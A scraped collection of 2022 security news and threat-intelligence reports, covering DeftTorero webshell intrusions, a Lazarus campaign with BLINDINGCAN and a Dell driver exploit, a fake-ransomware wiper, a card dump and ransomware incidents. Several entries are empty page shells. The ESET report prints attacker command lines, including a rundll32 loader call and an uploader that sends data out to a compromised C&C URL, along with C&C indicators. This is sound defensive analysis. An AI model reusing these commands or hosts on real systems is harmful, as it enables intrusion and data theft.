[
   {
      "time": "2022-10-10",
      "title": "DeftTorero TTPs in 2019–2021 | Securelist",
      "text": " Solutions for:ThreatsCategories03 Oct 2022\n  minute read\t\t\t\t\t\t\t\tTable of ContentsAuthorsThe public reports available to date expose and discuss the final payload – Explosive RAT – and the webshells used in the initial foothold such as Caterpillar and ASPXSpy (you can find webshell MD5 hashes in the IoC section), with little on the tactics, techniques and procedures (TTPs); this post focuses primarily on the TTPs used by the threat actor in intrusions between late 2019 and mid-2021 to compromise victims.More information about DeftTorero is available to customers of Kaspersky Intelligence Reporting.During our intrusion analysis of DeftTorero’s webshells, such as Caterpillar, we noticed traces that infer the threat actor possibly exploited a file upload form and/or a command injection vulnerability in a functional or staging website hosted on the target web server. This assumption is based on the fact that the uploaded webshells always drop in the same web folder, and in some cases get assigned a name containing a GUID followed by the original webshell filename.In other instances, we noticed traces pointing to a possible exploitation of IIS PHP plugins pre-installed by the server admins. And finally, in some other instances, we suspect the operators gained server credentials from other systems in the same organization and logged in using a remote desktop (MSTSC.exe) to deploy the webshell.Upon successful installation of the webshell, the operators run multiple commands to gain situational awareness from the exploited system. This includes testing network connectivity by pinging Google.com, listing current folders, identifying the current user privileges, enumerating local system users, and listing websites hosted by the compromised server. The operators also attempt to assess if the web server is joined and/or trusted by any domain. At a later stage, this will prove useful as it will inform them on the next course of actions for dumping local or domain credentials.Table. 1 Operator commands executed through webshellAfter gaining situational awareness, the operators attempt to load/invoke a number of tools to dump local and domain credentials. In some cases, the threat actor attempts to install Nmap and Advanced Port Scanner, possibly to scan internal systems.Credential dumping methods differed from one case to another. In some instances, Lazagne.exe was used, in others Mimikatz variants were used either by executing the respective PE binary or by invoking a base64-encoded PowerShell version from a GitHub project. In a smaller number of instances, possibly due to AV detection, the operators dumped the LSASS.exe process to disk, most probably to process it offline for credential dumping.Table. 2 Operators invoking Mimikatz variantsOnce credentials are obtained, it is believed the operators use Remote Desktop Protocol to pivot into internal systems, or reachable systems that are likely using the stolen credentials (e.g., trusted partners). This is also reinforced by timeline analysis where the threat actor deployed a webshell at another web server in the same network without exploiting a file upload form/vulnerability.Further commands were executed to bypass the AV engine and establish a Meterpreter session with the operators’ C2 server. After a Meterpreter session is established, the operators attempt to again invoke Mimikatz variants to gain system and/or domain credentials. It’s worth mentioning that in older intrusions, the threat actor deployed Explosive RAT instead of using Meterpreter.Table. 3 Operator commands to establish further presence on other servers in the same networkTable. 4 Creating a shadow copyTable. 5 Pattern changes in the newer Explosive RAT campaignA second noticeable change made to evade defense was introduced to the function names exported by the DLL component of Explosive RAT. Below is a list of changes in the export table.Table. 6 New function names compared to the old ones used in the 2015 campaignBased on our telemetry, the indicators of the intrusions we assessed between late 2019 and mid-2021 are similar to the usual DeftTorero victimology, with a clear focus on Middle Eastern countries such as Egypt, Jordan, Kuwait, Lebanon, Saudi Arabia, Turkey and the United Arab Emirates.The targeted web servers occasionally host multiple websites belonging to different industry verticals such as Corporate, Education, Government, Military, Media, and Telcos. This presents the threat actor with the opportunity to pivot to other victims of interest.In this post, we described the potential tactics, techniques and procedures identified in previous DeftTorero intrusions that were largely missing from public reports. As our telemetry and public reports did not identify any new Explosive RAT detections after 2020, but only old slightly modified toolsets (e.g., Explosive RAT, webshells, etc.), the historical intrusions analysis we conducted suggest a potential TTP shift by the threat actor to more fileless/LOLBINS techniques, and the use of known/common offensive tools available on the internet. This TTP shift could explain the detection gap in previous years because using fileless techniques and public tools allows the operators to blend in with other threat activities.There are two recommended defensive measures to combat such intrusions, aside from assessing web vulnerabilities, namely, monitoring web server file integrity and occasionally scanning web server backups; we have noticed that some of the threat actor post-exploitation tools were actually inside website backups, and continued to exist after the initial intrusion. If the backups were restored at a later stage, the threat actor could regain persistent access and continue where they left off.Note: We provide an incomplete list of IoCs here that are valid at the time of publication. A full IoC list is available in our private report.AuthorsDeftTorero: tactics, techniques and procedures of intrusions revealedYour email address will not be published. Required fields are marked *Name * Email * ΔTable of ContentsGReAT webinarsFrom the same authorsThe hottest research right in your inboxΔIn the same categoryAsian APT groups target various organizations from a multitude of regions and industries. We created this report to provide the cybersecurity community with the best-prepared intelligence data to effectively counteract Asian APT groups.We unveil a Lazarus campaign exploiting security company products and examine its intricate connections with other campaignsHow Kaspersky researchers obtained all stages of the Operation Triangulation campaign targeting iPhones and iPads, including zero-day exploits, validators, TriangleDB implant and additional modules.Nobody would even suspect the mining malware was merely a mask, masquerading behind an intricate modular framework that supports both Linux and Windows.  The amount of effort that went into creating the framework is truly remarkable, and its disclosure was quite astonishing.The hottest research right in your inboxΔThreatsCategories© 2023 AO Kaspersky Lab. All Rights Reserved.\nRegistered trademarks and service marks are the property of their respective owners.The hottest research right in your inboxΔ"
   },
   {
      "time": "2022-10-10",
      "title": "Amazon-themed campaigns of Lazarus in the Netherlands and Belgium",
      "text": " \n      Award-winning news, views, and insight from the ESET security community\n    \n        Award-winning news, views, and insight from the ESET security community\n      ESET ResearchESET researchers have discovered Lazarus attacks against targets in the Netherlands and Belgium that use spearphishing emails connected to fake job offers\n30 Sep 2022\n • \n, \n24 min. read\n\nKey findings in this blogpost:\n\nThe Lazarus campaign targeted an employee of an aerospace company in the Netherlands, and a political journalist in Belgium.\nThe most notable tool used in this campaign represents the first recorded abuse of the CVE‑2021‑21551 vulnerability. This vulnerability affects Dell DBUtil drivers; Dell provided a security update in May 2021.\nThis tool, in combination with the vulnerability, disables the monitoring of all security solutions on compromised machines. It uses techniques against Windows kernel mechanisms that have never been observed in malware before.\nLazarus also used in this campaign their fully featured HTTP(S) backdoor known as BLINDINGCAN.\nThe complexity of the attack indicates that Lazarus consists of a large team that is systematically organized and well prepared.\n\nESET researchers discovered two new attacks: one against personnel of a media outlet in Belgium and one against an employee of an aerospace company in the Netherlands.Figure 1. Amazon-themed document sent to the target in the NetherlandsWithin hours, several malicious tools were delivered to the system, including droppers, loaders, fully featured HTTP(S) backdoors, HTTP(S) uploaders and HTTP(S) downloaders; see the Toolset section.Regarding the attack in Belgium, the employee of a journalism company (whose email address was publicly available on the company’s website) was contacted via an email message with the lure AWS_EMEA_Legal_.docx attached. Since we didn’t obtain the document, we know only its name, which suggests it might have been making a job offer in a legal position. After opening the document, the attack was triggered, but stopped by ESET products immediately, with just one malicious executable involved. The interesting aspect here is that, at that time, this binary was validly signed with a code-signing certificate.We attribute both attacks to the Lazarus group with a high level of confidence. This is based on the following factors, which show relationships to other Lazarus campaigns:The droppers may (Table 1) or may not (Table 2) be side-loaded by a legitimate (Microsoft) process. In the first case here, the legitimate application is at an unusual location and the malicious component bears the name of the corresponding DLL that is among the application’s imports. For example, the malicious DLL coloui.dll is side-loaded by a legitimate system application Color Control Panel (colorcpl.exe), both located at C:\\ProgramData\\PTC\\. However, the usual location for this legitimate application is %WINDOWS%\\System32\\.In all cases, at least one command line argument is passed during runtime that serves as an external parameter required to decrypt the embedded payload. Various decryption algorithms are used; see the last column in Table 1 and Table 2. In several cases when AES-128 is used, there’s also an internal, hardcoded parameter together with the name of the parent process and its DLL name, all required for successful decryption.Table 1. Malicious DLLs side-loaded by a legitimate process from an unusual location\n\n\nLocation folder\nLegitimate parent process\nMalicious side-loaded DLL\nTrojanized project\nExternal parameter\nDecryption algorithm\n\n\n\n\nC:\\ProgramData\\PTC\\\ncolorcpl.exe\ncolorui.dll\nlibcrypto of LibreSSL 2.6.5\nBE93E050D9C0EAEB1F0E6AE13C1595B5\n(Loads BLINDINGCAN)\nXOR\n\n\nC:\\Windows\\Vss\\\nWFS.exe\ncredui.dll\nGOnpp v1.2.0.0 (Notepad++ plug‑in)\nA39T8kcfkXymmAcq\n(Loads the intermediate loader)\nAES-128 \n\n\nC:\\Windows\\security\\\nWFS.exe\ncredui.dll\nFingerText 0.56.1 (Notepad++ plug‑in)\nN/A \nAES-128\n\n\nC:\\ProgramData\\Caphyon\\\nwsmprovhost.exe\nmi.dll\nlecui 1.0.0 alpha 10\nN/A \nAES-128\n\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\\nSMSvcHost.exe\ncryptsp.dll\nlecui 1.0.0 alpha 10\nN/A\nAES-128\n\n\nTable 2. Other malware involved in the attack\n\n\nLocation folder\nMalware\nTrojanized project\nExternal parameter\nDecryption algorithm\n\n\n\n\nC:\\PublicCache\\\nmsdxm.ocx\nlibpcre 8.44\n93E41C6E20911B9B36BC\n(Loads the HTTP(S) downloader)\nXOR\n\n\nC:\\ProgramData\\Adobe\\\nAdobe.tmp\nSQLite 3.31.1\nS0RMM‑50QQE‑F65DN‑DCPYN‑5QEQA\n(Loads the HTTP(S) updater)\nXOR\n\n\nC:\\PublicCache\\\nmsdxm.ocx\nsslSniffer\nMissing \nHC-128\n\n\nAfter successful decryption, the buffer is checked for the proper PE format and execution is passed to it. This procedure can be found in most of the droppers and loaders. The beginning of it can be seen in Figure 2.Figure 2. The decrypted buffer is a 64-bit executableWe identified a fully featured HTTP(S) backdoor – a RAT known as BLINDINGCAN – used in the attack.This payload’s dropper was executed as %ALLUSERSPROFILE%\\PTC\\colorui.dll; see Table 1 for details. The payload is extracted and decrypted using a simple XOR but with a long key, which is a string built by concatenating the name of the parent process, is own filename, and the external command line parameter – here COLORCPL.EXECOLORUI.DLLBE93E050D9C0EAEB1F0E6AE13C1595B5.Figure 3. Code comparison of plain (upper, unprotected) and virtualized (lower, VMProtect-ed) variants of BLINDINGCAN, with an agreement of two command indices, 8256 and 8201Table 3. The RAT’s commands\n\n\nCommand\nDescription\n\n\n\n\n8201\nSend system information like computer name, Windows version, and the code page.\n\n\n8208\nGet the attributes of all files in mapped RDP folders (\\\\tsclient\\C etc.).\n\n\n8209\nRecursively get the attributes of local files.\n\n\n8210\nExecute a command in the console, store the output to a temporary file, and upload it.\n\n\n8211\nZip files in a temporary folder and upload them.\n\n\n8212\nDownload a file and update its time information.\n\n\n8214\nCreate a new process in the console and collect the output.\n\n\n8215\nCreate a new process in the security context of the user represented by the specified token and collect the output.\n\n\n8217\nRecursively create a process tree list.\n\n\n8224\nTerminate a process.\n\n\n8225\nDelete a file securely.\n\n\n8226\nEnable nonblocking I/O via TCP socket (socket(AF_INET ,  SOCK_STREAM ,  IPPROTO_TCP)  with the FIONBIO control code).\n\n\n8227\nSet the current directory for the current process.\n\n\n8231\nUpdate the time information of the selected file.\n\n\n8241\nSend the current configuration to the C&C server.\n\n\n8242\nUpdate the configuration.\n\n\n8243\nRecursively list the directory structure.\n\n\n8244\nGet type and free disk space of a drive.\n\n\n8249\nContinue with the next command.\n\n\n8256\nRequest another command from the C&C server.\n\n\n8262\nRewrite a file without changing its last write time.\n\n\n8264\nCopy a file to another destination.\n\n\n8265\nMove a file to another destination.\n\n\n8272\nDelete a file.\n\n\n8278\nTake a screenshot.\n\n\nNow we describe a three-stage chain where, unfortunately, we were able to identify only the first two steps: a dropper and an intermediate loader.The first stage is a dropper located at C:\\Windows\\Vss\\credui.dll and was run via a legitimate – but vulnerable to DLL search-order hijacking – application with the (external) parameter C:\\Windows\\Vss\\WFS.exe A39T8kcfkXymmAcq. The program WFS.exe is a copy of the Windows Fax and Scan application, but its standard location is %WINDOWS%\\System32\\.The goal of this intermediate stage is to load an additional payload in memory and execute it. It performs this task in two steps. It first reads and decrypts the configuration file C:\\windows\\System32\\wlansvc.cpl, which is not, as its extension might suggest, an (encrypted) executable, but a data file containing chunks of 14944 bytes with configuration. We didn’t have the particular data from the current attack; however, we obtained such configuration from another Lazarus attack: see Figure 5.The configuration is expected to start with a double word representing the total size of the remaining buffer (see Line 69 in Figure 4 below and the variable u32TotalSize), followed by an array of 14944 byte-long structures containing at least two values: the name of the loading DLL as a placeholder for identifying the rest of the configuration (at the offset 168 of Line 74 in Figure 4 and the highlighted member in Figure 5).Figure 4. The first step of decrypting the configuration file and checking if the name of the loading DLL matches the expected oneThe second step is the action of reading, decrypting, and loading this file that represents very likely the third and final stage. It is expected to be a 64-bit executable and is loaded into the memory the same way the first-stage dropper handled the intermediate loader. At the start of execution, a mutex is created as a concatenation of the string Global\\AppCompatCacheObject and the CRC32 checksum of its DLL name (credui.dll) represented as a signed integer. The value should equal Global\\AppCompatCacheObject-1387282152 if wlansvc.cpl exists and -1387282152 otherwise.Figure 5. A configuration of the intermediate loader. The highlighted file name is expected to match with the name of the running malware; see also Figure 4.Figure 6. Key expansion of RC6A downloader using the HTTP(S) protocols was delivered onto the target’s system as well.It was installed by a first stage dropper (SHA1: 001386CBBC258C3FCC64145C74212A024EAA6657), which is a trojanized libpcre-8.44 library. It was executed by the commandcmd.exe /c start /b rundll32.exe C:\\PublicCache\\msdxm.ocx,sCtrl 93E41C6E20911B9B36BC(the parameter is an XOR key for extracting the embedded payload; see Table 2). The dropper also achieves persistence by creating the OneNoteTray.LNK file located in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup folder.The second stage is a 32-bit VMProtect-ed module that makes an HTTP connection request to a C&C server stored in its configuration; see Figure 7. It uses the same User Agent – Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/28.0.1500.95 Safari/537.36 – as BLINDINGCAN RAT, contains the RTTI artifact .?AVCHTTP_Protocol@@ but not .?AVCFileRW@@, and lacks features like taking screenshots, archiving files, or executing a command via the command line. It is able to load an executable to a newly allocated memory block and pass code execution to it.Figure 7. A configuration of the HTTP(S) downloader. The highlighted values are the size of the configuration and the number of URLs. In the attack we observed, all the URLs were identical.This Lazarus tool is responsible for data exfiltration, by using the HTTP or HTTPS protocols.C:\\ProgramData\\IBM\\~DF234.TMP S0RMM-50QQE-F65DN-DCPYN-5QEQA https://www.gonnelli.it/uploads/catalogo/thumbs/thumb.asp C:\\ProgramData\\IBM\\restore0031.dat data03 10000 -p 192.168.1.240 8080The first parameter, S0RMM-50QQE-F65DN-DCPYN-5QEQA, worked as a key for the decryption routine of the dropper (to be more precise, an obfuscation was performed first, where the encrypted buffer was XOR-ed with its copy shifted by one byte; then an XOR decryption with the key followed). The rest of the parameters are stored in a structure and passed to the second stage. For the explanation of their meanings, see Table 4.Table 4. Command line parameters for the HTTP(S) updater\n\n\nParameter\nValue\nExplanation\n\n\n\n\n1\nS0RMM-50QQE-F65DN-DCPYN-5QEQA\nA 29-byte decryption key.\n\n\n2\nhttps://<...>\nC&C for data exfiltration.\n\n\n3\nC:\\ProgramData\\IBM\\restore0031.dat\nThe name of a local RAR volume.\n\n\n4\ndata03\nThe name of the archive on the server side.\n\n\n5\n10,000\nThe size of a RAR split (max 200,000 kB).\n\n\n6\nN/A\nStarting index of a split.\n\n\n7\nN/A\nEnding index of a split.\n\n\n8\n-p 192.168.1.240 8080\nA switch  -p\n\n\n9\n#rowspan#\nProxy IP address\n\n\n10\n#rowspan#\nProxy Port\n\n\nThe second stage is the HTTP uploader itself. The only parameter for this stage is a structure containing the C&C server for the exfiltration, the filename of a local RAR archive, the root name of a RAR archive on the server-side, the total size of a RAR split in kilobytes, an optional range of split indices, and an optional -p switch with the internal proxy IP and a port; see Table 4. For example, if the RAR archive is split into 88 chunks, each 10,000 kB large, then the uploader would submit these splits and store them on the server side under names data03.000000.avi, data03.000001.avi, …, data03.000087.avi. See Figure 8, Line 42 where these strings are formatted.The User-Agent is the same as for BLINDINGCAN and the HTTP(S) downloader,  Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/28.0.1500.95 Safari/537.36.Figure 8. The exfiltration of RAR splits to a C&C serverAdditional droppers and loaders were discovered in the attacks, but we didn’t obtain the necessary parameters to decrypt the embedded payloads or encrypted files.Figure 9. Validly signed but already expired certificateIt has two malicious exports that the legitimate DLL doesn’t have: SetOfficeCertInit and SetOfficeCert. Both exports require exactly two parameters. The purpose of the first export is to establish persistence by creating OfficeSync.LNK, located in %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup, pointing to the malicious DLL and running its second export via rundll32.exe with the parameters passed to itself.The second export, SetOfficeCert, uses the first parameter as a key to decrypt the embedded payload, but we couldn’t extract it, because the key is not known to us.Figure 10. The key setup with highlighted constants suggesting the HC-128 cipherIn this attack, as well as in many others attributed to Lazarus, we saw that many tools were distributed even on a single targeted endpoint in a network of interest. Without a doubt, the team behind the attack is quite large, systematically organized, and well prepared. For the first time in the wild, the attackers were able to leverage CVE-2021-21551 for turning off the monitoring of all security solutions. It was not just done in kernel space, but also in a robust way, using a series of little- or undocumented Windows internals. Undoubtedly this required deep research, development, and testing skills.From the defenders’ point of view, it seems easier to limit the possibilities of initial access than to block the robust toolset that would be installed after determined attackers gain a foothold in the system. As in many cases in the past, an employee falling prey to the attackers’ lure was the initial point of failure here. In sensitive networks, companies should insist that employees not pursue their personal agendas, like job hunting, on devices belonging to their company’s infrastructure.\n\n\nSHA-1\nFilename\nDetection\nDescription\n\n\n\n\n296D882CB926070F6E43C99B9E1683497B6F17C4\nFudModule.dll\nWin64/Rootkit.NukeSped.A\nA user‑mode module that operates with the kernel memory.\n\n\n001386CBBC258C3FCC64145C74212A024EAA6657\nC:\\PublicCache\\msdxm.ocx\nWin32/NukeSped.KQ\nA dropper of the HTTP(S) downloader.\n\n\n569234EDFB631B4F99656529EC21067A4C933969\ncolorui.dll\nWin64/NukeSped.JK\nA dropper of BLINDINGCAN side-loaded by a legitimate colorcpl.exe.\n\n\n735B7E9DFA7AF03B751075FD6D3DE45FBF0330A2\nN/A\nWin64/NukeSped.JK\nA 64-bit variant of the BLINDINGCAN RAT.\n\n\n4AA48160B0DB2F10C7920349E3DCCE01CCE23FE3\nN/A\nWin32/NukeSped.KQ\nAn HTTP(S) downloader.\n\n\nC71C19DBB5F40DBB9A721DC05D4F9860590A5762\nAdobe.tmp\nWin64/NukeSped.JD\nA dropper of the HTTP(S) uploader.\n\n\n97DAAB7B422210AB256824D9759C0DBA319CA468\ncredui.dll\nWin64/NukeSped.JH\nA dropper of an intermediate loader.\n\n\nFD6D0080D27929C803A91F268B719F725396FE79\nN/A\nWin64/NukeSped.LP\nAn HTTP(S) uploader.\n\n\n83CF7D8EF1A241001C599B9BCC8940E089B613FB\nN/A\nWin64/NukeSped.JH\nAn intermediate loader that loads an additional payload from the file system.\n\n\nC948AE14761095E4D76B55D9DE86412258BE7AFD\nDBUtil_2_3.sys\nWin64/DBUtil.A\nA legitimate vulnerable driver from Dell, dropped by FudModule.dll.\n\n\n085F3A694A1EECDE76A69335CD1EA7F345D61456\ncryptsp.dll\nWin64/NukeSped.JF\nA dropper in the form of a trojanized lecui library.\n\n\n55CAB89CB8DABCAA944D0BCA5CBBBEB86A11EA12\nmi.dll\nWin64/NukeSped.JF\nA dropper in the form of a trojanized lecui library.\n\n\n806668ECC4BFB271E645ACB42F22F750BFF8EE96\ncredui.dll\nWin64/NukeSped.JC\nA trojanized FingerText plug-in for Notepad++.\n\n\nBD5DCB90C5B5FA7F5350EA2B9ACE56E62385CA65\nmsdxm.ocx\nWin32/NukeSped.KT\nA trojanized version of LibreSSL’s sslSniffer.\n\n\n\n\n\nIP\nProvider\nFirst seen\nDetails\n\n\n\n\n67.225.140[.]4\nLiquid Web, L.L.C\n2021‑10‑12\nA compromised legitimate WordPress-based site hosting the C&C serverhttps://turnscor[.]com/wp-includes/feedback.php\n\n\n50.192.28[.]29\nComcast Cable Communications, LLC\n2021‑10‑12\nA compromised legitimate site hosting the C&C server  https://aquaprographix[.]com/patterns/Map/maps.php\n\n\n31.11.32[.]79\nAruba S.p.A.\n2021‑10‑15\nA compromised legitimate site hosting the C&C server  http://www.stracarrara[.]org/images/img.asp\n\n\n\n      Sign up for our newsletters\n    ESET ResearchUnlucky Kamran: Android malware spying on Urdu-speaking residents of Gilgit-BaltistanESET ResearchUnlucky Kamran: Android malware spying on Urdu-speaking residents of Gilgit-Baltistan • ESET ResearchWho killed Mozi? Finally putting the IoT zombie botnet in its graveESET ResearchWho killed Mozi? Finally putting the IoT zombie botnet in its grave • ESET Research, Threat ReportsESET APT Activity Report Q2–Q3 2023ESET Research, Threat ReportsESET APT Activity Report Q2–Q3 2023 • \n            Award-winning news, views, and insight from the ESET security community\n          "
   },
   {
      "time": "2022-10-10",
      "title": "Malicious Actors Are Exploiting ‘App Mode’ in Chromium Browsers for Phishing Attacks - CySecurity News - Latest Information Security and Hacking Incidents",
      "text": "  your nameYour Emailyour message"
   },
   {
      "time": "2022-10-10",
      "title": "Private Data of Nearly 296,000 User Compromised in Toyota Data Breach  - CySecurity News - Latest Information Security and Hacking Incidents",
      "text": "  your nameYour Emailyour message"
   },
   {
      "time": "2022-10-10",
      "title": "Facebook Detects 400 Android and iOS Apps Stealing Users Log-in Credentials",
      "text": " Meta Platforms on Friday disclosed that it had identified over 400 malicious apps on Android and iOS that it said targeted online users with the goal of stealing their Facebook login information.42.6% of the rogue apps were photo editors, followed by business utilities (15.4%), phone utilities (14.1%), games (11.7%), VPNs (11.7%), and lifestyle apps (4.4%). Interestingly, a majority of the iOS apps posed as ads manager tools for Meta and its Facebook subsidiary.Besides concealing its malicious nature as a set of seemingly harmless apps, the operators of the scheme also published fake reviews that were designed to offset the negative reviews left by users who may have previously downloaded the apps.The apps ultimately functioned as a means to steal the credentials entered by users by displaying a \"Login With Facebook\" prompt.\"If the login information is stolen, attackers could potentially gain full access to a person's account and do things like message their friends or access private information,\" the company said.As always with apps like these, it's essential to exercise caution before downloading apps and granting access to Facebook to access the promised functionality. This includes scrutinizing app permissions and reviews, and also verifying the authenticity of the app developers.Discover how application detection, response, and automated behavior modeling can revolutionize your defense against insider threats.Join the conversation to learn how to combat Zenbleed and Kubernetes attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2022-10-10",
      "title": "Cyberattack Triggers a Service Outage at Hartnell College - CySecurity News - Latest Information Security and Hacking Incidents",
      "text": " your nameYour Emailyour message"
   },
   {
      "time": "2022-10-10",
      "title": "Fake adult sites push data wipers disguised as ransomware",
      "text": " Malicious adult websites push fake ransomware which, in reality, acts as a wiper that quietly tries to delete almost all of the data on your device.While it is unclear how the threat actors promoted the websites, they all used host names that indicated they were offering nude photos, such as nude-girlss.mywire[.]org, sexyphotos.kozow[.]com, and sexy-photo[.]online.According to threat intelligence firm Cyble, who first reported on the campaign, the websites would automatically prompt users to download an executable named SexyPhotos.JPG.exe that impersonates a JPG image.Upon launch, the fake ransomware drops four executables (del.exe, open.exe, windll.exe, and windowss.exe) and one batch file (avtstart.bat) in the user's %temp% directory and runs them.The batch file establishes persistence by copying all four executables to the Windows Startup folder.Next, \"windowss.exe\" is executed to drop three additional files, including \"windows.bat,\" which performs the renaming. The file types and folders targeted by the batch file are given in the table below.\n​The result is the renaming of all files to a generic name, like 'Lock_6.fille'. So, while the contents of these files haven't been modified or encrypted, the victims would have no way to figure out their original names.The ransom notes are dropped by \"windll.exe\" in various locations under the name \"Readme.txt.\"The note demands a payment of $300 in Bitcoin in three days, threatening to double it to $600 for an extended deadline of seven days, after which all files will be permanently deleted on the attacker's server.In reality, this fake ransomware has not stolen any data, and as previously mentioned, it's unlikely that the malware author has developed a tool to recover the files.However, the malware doesn't appear to be ransomware and was designed only to use the fake encryption as a decoy while deleting almost all of the files on your drives.Cyble discovered that after performing the fake encryption, the malware attempts to execute “dell.exe,” but due to a naming error that results in dropping “del.exe” instead, this step doesn’t work in the sample seen by Cyble.If the threat actors fix this minor error, “dell.exe” will run to delete all system drives from [A:\\ – Z:\\] except for the C:\\ drive.Finally, the malware executes \"open.exe,\" which drops and runs \"open.bat,\" which, in turn, connects to the URL \"hxxps[:]//lllllllllll.loseyourip[.]com/downloads\" and then opens the ransom note.This fake ransomware is an excellent example of how carelessness can lead to data loss, even by buggy, unsophisticated malware.A possible way to recover from this malware would be to restore your OS to a previous state since the fake ransomware doesn't delete shadow copies.Of course, this could still result in data loss, depending on the date of the last restore point.In general, regular backups of your most important data would be the best practice, as an OS re-installation should be the quickest way out of this trouble."
   },
   {
      "time": "2022-10-10",
      "title": "Darkweb market BidenCash gives away 1.2 million credit cards for free",
      "text": " A dark web carding market named 'BidenCash' has released a massive dump of 1,221,551 credit cards to promote their marketplace, allowing anyone to download them for free to conduct financial fraud.BidenCash is a stolen cards marketplace launched in June 2022, leaking a few thousand cards as a promotional move.The threat actors announced the credit card dump yesterday on new URLs BidenCash launched late last month in response to DDoS (distributed denial of service) attacks, so it could be a way to promote the new shop domains.To ensure larger reach, the crooks distribute the collection via a clearnet domain and on other hacking and carding forums.The dump of 1.2 million credit cards includes the following credit card and associated personal information:Not all the above details are available for all 1.2 million records, but most entries seen by BleepingComputer contain over 70% of the data types.The analysts claim these cards mainly come from web skimmers, which are malicious scripts injected into checkout pages of hacked e-commerce sites that steal submitted credit card and customer information.Dark web posts and offers of this size are usually scams, so the massive dump of cards could easily be fake data or recycled data from old dumps repackaged under a new name.BleepingComputer has discussed the authenticity with analysts at D3Lab, who confirmed that the data is real with several Italian banks, so the leaked entries correspond to real cards and cardholders.However, many of the entries were recycled from previous collections, like the one  'All World Cards' gave away for free last year.From the data D3Labs has examined so far, about 30% appear to be fresh, so if this applies roughly to the entire dump, at least 350,000 cards would still be valid.Of the Italian cards, roughly 50% have already been blocked due to the issuing banks having detected fraudulent activity, which means that the actually usable entries in the leaked collection may be as low as 10%."
   },
   {
      "time": "2022-10-10",
      "title": "CommonSpirit hospital chains hit by ransomware, patients are facing problems",
      "text": " The alleged security breach led to delayed surgeries, hold-ups in patient care and forced the chain to reschedule doctor appointments across the country.CommonSpirit Health confirmed it had experienced an IT security issue that forced it to take part of its infrastructure offline.“We are grateful to our staff and physicians, who are doing everything possible to minimize the impact to our patients.” continues the statement.“We take our responsibility to our patients very seriously and apologize for any inconvenience.”NBC News, citing a person familiar with its remediation efforts, revealed that the organization suffered a ransomware attack.CommonSpirit did not share details about the problems its hospitals are facing across the country. [adrotate banner=”5″][adrotate banner=”13″]\nCopyright@securityaffairs 2023 "
   },
   {
      "time": "2022-10-10",
      "title": "Everest gang demands $200K for data stolen from South Africa state-owned electricity company ESKOM",
      "text": " In March 2022, the Everest ransomware operators published a notice announcing the sale of “South Africa Electricity company’s root access” for $125,000. Eskom transforms inputs from the natural environment – coal, nuclear, fuel, diesel, water, and wind – into more than 90% of the energy supplied to a wide range of customers in South Africa and the Southern African Development Community (SADC) region. Eskom is one of the few remaining vertically integrated utilities connected to the Southern African Power Pool (SAPP) through an interconnected grid, which serves to support grid stability. At the time, the company denied having suffered a security breach:Thank you for the heads-up. Whilst Eskom combats regular attempted attacks there is no evidence that we have suffered a ransomware attack. We have an information & cybersecurity team/tools that assist with combatting attempted attacks. For security reasons we cannot share detailsThis week, security experts reported that ESKOM Hld SOC Ltd was having some server issues. At the same time, the Everest Ransom gang posted a claim about the hack of the South African state-owned electricity company.The threat actors claim to have had access to all servers of the company and to have root access to many of them. “Administration servers, Databases, backups, employee access to the administration of POS terminals and much more. Multiple settings and developments. You can become the king of electricity the whole country. Trust access of a well-known defense company from USA, which is a partner of this Electric Company.” reads the message published on the Tor leak site of the gang. The ransomware gang is offering a package including servers with administrator, root, sysadmin passwords for Linux and Windows servers, and more.The criminals are demanding $200,000 for the stolen access, they accept both Bitcoin and Monero cryptocurrencies.Price 200,000 $[adrotate banner=”5″][adrotate banner=”13″]\nCopyright@securityaffairs 2023 "
   },
   {
      "time": "2022-10-10",
      "title": "Intel confirms leaked Alder Lake BIOS Source Code is authentic",
      "text": " Intel has confirmed that a source code leak for the UEFI BIOS of Alder Lake CPUs is authentic, raising cybersecurity concerns with researchers.Alder Lake is the name of Intel's 12th generation Intel Core processors, released in November 2021. On Friday, a Twitter user named 'freak' posted links to what was said to be the source code for Intel Alder Lake's UEFI firmware, which they claim was released by 4chan.The link led to a GitHub repository named 'ICE_TEA_BIOS' that was uploaded by a user named 'LCFCASD.' This repository contained what was described as the 'BIOS Code from project C970.'The leak contains 5.97 GB of files, source code, private keys, change logs, and compilation tools, with the latest timestamp on the files being 9/30/22, likely when a hacker or insider copied the data.BleepingComputer has been told that all the source code was developed by Insyde Software Corp, a UEFI system firmware development company.The leaked source code also contains numerous references to Lenovo, including code for integrations with 'Lenovo String Service', 'Lenovo Secure Suite', and 'Lenovo Cloud Service.'At this time, it is unclear whether the source code was stolen during a cyberattack or leaked by an insider.\"Our proprietary UEFI code appears to have been leaked by a third party. We do not believe this exposes any new security vulnerabilities as we do not rely on obfuscation of information as a security measure. This code is covered under our bug bounty program within the Project Circuit Breaker campaign, and we encourage any researchers who may identify potential vulnerabilities to bring them our attention through this program. We are reaching out to both customers and the security research community to keep them informed of this situation.\" - Intel spokesperson.While Intel has downplayed the security risks of the source code leak, security researchers warn that the contents could make it easier to find vulnerabilities in the code.\"The Insyde’s solution can help the security researchers, bug hunters (and the attackers) find the vulnerablity and understand the result of reverse engineering easily, which adds up to the long-term high risk to the users.\"While it is not clear if the leaked private key is used in production, if it is, hackers could potentially use it to modify the boot policy in Intel firmware and bypass hardware security.BleepingComputer has contacted Intel, Insyde, and Lenovo with questions about the leak and whether the private keys were used in production.We will update this article with any responses as we learn more."
   },
   {
      "time": "2022-10-10",
      "title": "BlackByte Ransomware Abuses Vulnerable Windows Driver to Disable Security Solutions",
      "text": " In yet another case of bring your own vulnerable driver (BYOVD) attack, the operators of the BlackByte ransomware are leveraging a flaw in a legitimate Windows driver to bypass security solutions.To protect against BYOVD attacks, it's recommended to keep track of the drivers installed on the systems and ensure they are up-to-date, or opt to blocklist drivers known to be exploitable.Discover how application detection, response, and automated behavior modeling can revolutionize your defense against insider threats.Join the conversation to learn how to combat Zenbleed and Kubernetes attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   }
]